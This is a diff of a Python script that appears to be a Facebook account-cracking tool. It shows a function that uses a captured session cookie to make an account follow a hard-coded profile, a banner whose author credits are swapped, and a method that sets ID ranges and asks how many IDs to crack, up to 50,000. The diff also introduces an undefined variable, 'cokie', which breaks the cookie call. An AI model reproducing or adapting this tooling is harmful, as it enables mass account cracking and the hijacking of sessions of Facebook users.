@@ -385,7 +385,7 @@ def follow(ses,coki):
 	ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
 	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=AHSAM.JOIYA', cookies={'cookie': coki}).text, 'html.parser')
 	get = r.find('a', string='Follow').get('href')
-	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
+	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': cokie}).text
 
 logo = ("""\033[1;32m
   
@@ -404,11 +404,11 @@ logo = ("""\033[1;32m
                 \033      
 __________________×______________________
   
-  Auther   :  MR AUH JOIYA
+  Auther   :  SAIKO HAKER  
  
-  Github   :  AHSAMJOIYA302
+  Github   :  JUBU the NOOB
 
-  Facebook : AHSAM UL HAQ
+  Facebook :  Md Nasrullha Jubair 
   
 __________________×______________________\033[1;37m""")
 
@@ -871,9 +871,9 @@ class Main:
 		self.loop +=1
 
 	def old2(self):
-		x = 1111111111
-		xx = 9999999999
-		idx = "10000" 
+		x = 11
+		xx = 99
+		idx = "1000000" 
 		os.system('clear');print(logo)
 		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
